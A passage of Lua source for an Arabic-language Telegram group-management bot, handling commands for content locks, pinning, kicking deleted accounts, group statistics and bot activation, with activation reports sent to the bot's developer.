if text and text:match("^الدخول$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:Join:mute'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local Feras_dev = "\n" .."⌁︙الدخول ↫ "..lock_Join.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الشبكات$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الشبكات ↫ "..lock_wp.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^المواقع$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:location:mute'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙المواقع ↫ "..lock_location.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^العربيه$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙العربيه ↫ "..lock_arabic.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الانجليزيه$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الانجليزيه ↫ "..lock_english.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الكفر$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'kaf'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local Feras_dev = "\n" .."⌁︙الكفر ↫ "..lock_kaf.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الفشار$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local Feras_dev = "\n" .."⌁︙الفشار ↫ "..lock_fshar.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الطائفيه$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local Feras_dev = "\n" .."⌁︙الطائفيه ↫ "..lock_taf.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
--     Source DevFeras     --
if text == 'تفعيل كشف الاعدادات' and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then   
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل كشف الاعدادات'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'abs:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل كشف الاعدادات'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:LockSettings'..msg.chat_id_) 
end
--     Source DevFeras     --
if text == 'تفعيل ضافني' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then   
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل منو ضافني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'Added:Me'..msg.chat_id_) 
end
if text == 'تعطيل ضافني' and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل منو ضافني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'Added:Me'..msg.chat_id_,true)  
end
--     Source DevFeras     --
if Sudo(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ⌁' then   
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل المغادره بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras.."Left:Bot"..bot_id)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ⌁' then  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل المغادره بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras.."Left:Bot"..bot_id,true) 
end end
--     Source DevFeras     --
if text and text:match("^ضع اسم (.*)$") and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تغيير اسم المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
--     Source DevFeras     --
if msg.content_.photo_ then
if DevFeras:get(DevFeras..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تغيير صورة المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل صورة المجموعه الان \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source DevFeras     --
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف صورة المجموعه \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false  
end
--     Source DevFeras     --
if Owner(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if DevFeras:sismember(DevFeras.."bot:pin:mutepin",msg.chat_id_) and not Monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
unpinmsg(msg.chat_id_)
DevFeras:del(DevFeras..'pinnedmsg'..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم الغاء تثبيت الرساله'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙ليست لدي صلاحية التثبيت !', 1, 'md')
return false  
end
end,nil)
end
--     Source DevFeras     --
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if DevFeras:sismember(DevFeras.."bot:pin:mutepin",msg.chat_id_) and not Monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local pin_id = DevFeras:get(DevFeras..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم اعادة تثبيت الرساله'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end end
end
--     Source DevFeras     --
if text and text:match("^طرد الحسابات المحذوفه$") and ChCheck(msg) or text and text:match("^طرد المحذوفين$") and ChCheck(msg) or text and text:match("^حذف المحذوفين$") and ChCheck(msg) or text and text:match("^مسح المحذوفين$") and ChCheck(msg) then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end
end
getUser(v.user_id_, cleanaccounts, nil)
end 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم طرد المحذوفين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--     Source DevFeras     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Feras(msg.chat_id_, msg.id_, 0,'⌁︙لا يوجد محظورين في المجموعه', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
DevFeras:del(DevFeras..'abs:Ban:'..msg.chat_id_)
x = x + 1
end
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المحظورين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
end
--     Source DevFeras     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = DevFeras:scard(DevFeras.."abs:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه ↫ ❨ '..dp.title_..' ❩\n⌁︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n⌁︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n⌁︙عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n⌁︙عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n⌁︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n⌁︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n', 1, 'md') 
end,nil)
end,nil)
end
--     Source DevFeras     --
if text and text:match('^كشف (-%d+)') then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط', 1, 'md')
else
local MonshList = DevFeras:scard(DevFeras.."abs:monshid:"..ChatId) or 0
local BanedList = DevFeras:scard(DevFeras.."abs:Ban:"..ChatId) or 0
local OwnerList = DevFeras:scard(DevFeras.."abs:owners:"..ChatId) or 0
local MutedList = DevFeras:scard(DevFeras.."abs:Muted:"..ChatId) or 0
local TkeedList = DevFeras:scard(DevFeras.."abs:abs:Tkeed:"..ChatId) or 0
local AdminsList = DevFeras:scard(DevFeras.."abs:admins:"..ChatId) or 0
local VipList = DevFeras:scard(DevFeras.."abs:vipmem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 'T.ME/DevFeras' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,Abs) 
if Abs.first_name_ ~= false then
MonshAbs = "["..Abs.first_name_.."](T.me/"..(Abs.username_ or "Dev_Prox")..")"
else 
MonshAbs = "الحساب محذوف"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n⌁︙الايدي ↫ ( `"..ChatId.."` )\n⌁︙المنشئ ↫ "..MonshAbs.."\n⌁︙عدد المدراء ↫ ( *"..OwnerList.."* )\n⌁︙عدد المنشئين ↫ ( *"..MonshList.."* )\n⌁︙عدد الادمنيه ↫ ( *"..AdminsList.."* )\n⌁︙عدد المميزين ↫ ( *"..VipList.."* )\n⌁︙عدد المحظورين ↫ ( *"..BanedList.."* )\n⌁︙عدد المقيدين ↫ ( *"..TkeedList.."* )\n⌁︙عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
--     Source DevFeras     --
if text and text:match("^غادر (-%d+)$")  then
local txt = { string.match(text, "^(غادر) (-%d+)$")}
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local leavegp = function(extra, result)
if result.id_ then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ [" .. result.title_ .. "]\n⌁︙تمت المغادره منها بنجاح", 1, "md")
Dev_Feras(txt[2], 0, 1, "⌁︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
chat_leave(result.id_, bot_id)
DevFeras:srem(DevFeras.."bot:groups", result.id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end end
getChat(txt[2], leavegp) 
end end
--     Source DevFeras     --
if text and text:match("^تعين عدد الاعضاء (%d+)$") and Sudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and Sudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
DevFeras:set(DevFeras..'abs:Num:Add:Bot',Num) 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
end
--     Source DevFeras     --
if text == 'تفعيل البوت الخدمي' then 
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل البوت الخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'lock:bot:free'..bot_id) 
end end
if text == 'تعطيل البوت الخدمي' then 
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل البوت الخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'lock:bot:free'..bot_id,true) 
end end
if text == 'تفعيل التنبيه' then 
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local  Feras_dev = '⌁︙تم تفعيل التنبيه على تغيير \n ~ ( صوره • اسم • معرف ) ~ : للاعضاء \n⌁︙في جميع مجموعات البوت ' 
Dev_Feras( msg.chat_id_, msg.id_, 1, Feras_dev, 1, "md") 
DevFeras:del(DevFeras..'lock:bot:ttt'..bot_id) 
end 
end
if text == 'تعطيل التنبيه' then 
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
Feras_dev = '⌁︙تم تعطيل التنبيه على تغيير \n ~ ( صوره • اسم • معرف ) ~ : للاعضاء\n⌁︙في جميع مجموعات البوت '
Dev_Feras( msg.chat_id_, msg.id_, 1, Feras_dev, 1, "md") 
DevFeras:set(DevFeras..'lock:bot:ttt'..bot_id,true) 
end
end
if text and text == "تفعيل تنبيه التغيرات" and ChCheck(msg) then
if DevFeras:get(DevFeras..'lock:bot:ttt'..bot_id) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙التنبيه على تغيير\n ~ ( صوره • اسم • معرف ) ~ : للاعضاء\n⌁︙معطل في جميع مجموعات البوت من قبل المطور ', 1, 'md')
return false 
end
if not Owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمشرفين فقط ', 1, 'md')
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل التنبيه على تغيير \n ~ ( صوره • اسم • معرف ) ~ : للاعضاء \n⌁︙في هذه المجموعه ', 1, 'md')
DevFeras:del(DevFeras.."lock:bot:ttt2:"..msg.chat_id_)
end
end
if text and text == "تعطيل تنبيه التغيرات" and ChCheck(msg) then 
if not Owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمشرفين فقط ', 1, 'md')
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل التنبيه على تغيير \n ~ ( صوره • اسم • معرف ) ~ : للاعضاء \n⌁︙في هذه المجموعه ', 1, 'md')
DevFeras:set(DevFeras.."lock:bot:ttt2:"..msg.chat_id_,"ok")
end
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تفعيل الالعاب' and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text == 'تعطيل اللعبه' and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then   
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الالعاب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:lock_geam'..msg.chat_id_,true)  
end
if text == 'تعطيل الالعاب' and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text == 'تعطيل اللعبه' and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الالعاب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:lock_geam'..msg.chat_id_) 
end
if text and text == "تفعيل الرابط" and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل رابط المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras.."bot:tt:link:"..msg.chat_id_)
end
if text and text == "تعطيل الرابط" and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل رابط المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras.."bot:tt:link:"..msg.chat_id_,"ok")
end
--     Source DevFeras     --
if text and text:match('^تفعيل$') and SudoBot(msg.sender_user_id_, msg.chat_id_) and SourceCh(msg) then
if ChatType ~= 'sp' then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevFeras:get(DevFeras..'abs:Num:Add:Bot') or 0) and not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevFeras:get(DevFeras..'abs:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
DevFeras:del(DevFeras..'abs:absmonsh:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevFeras:sadd(DevFeras.."abs:monsh:"..msg.chat_id_,admins[i].user_id_)
DevFeras:sadd(DevFeras.."abs:absmonsh:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevFeras:srem(DevFeras.."abs:monsh:"..msg.chat_id_,admins[i].user_id_)
DevFeras:srem(DevFeras.."abs:absmonsh:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevFeras:sismember(DevFeras..'bot:groups',msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyAdd","⌁︙تم تفعيل المجموعه "..dp.title_)  
DevFeras:sadd(DevFeras.."bot:groups",msg.chat_id_)
if not DevFeras:get(DevFeras..'abs:SudosGp'..msg.sender_user_id_..msg.chat_id_) then 
DevFeras:incrby(DevFeras..'abs:Sudos'..msg.sender_user_id_,1)
DevFeras:set(DevFeras..'abs:SudosGp'..msg.sender_user_id_..msg.chat_id_,"abs")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevFeras:set(DevFeras.."bot:group:link"..msg.chat_id_,LinkGroup) 
SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg.sender_user_id_, msg.chat_id_) and SourceCh(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevFeras:sismember(DevFeras..'bot:groups',msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد معطله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyAdd","⌁︙تم تعطيل المجموعه "..dp.title_)  
DevFeras:srem(DevFeras.."bot:groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevFeras:set(DevFeras.."bot:group:link"..msg.chat_id_,LinkGroup) 
SendText(DevId,"⌁︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
end
--     Source DevFeras     --
if text and text:match("^الدعم$") or text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
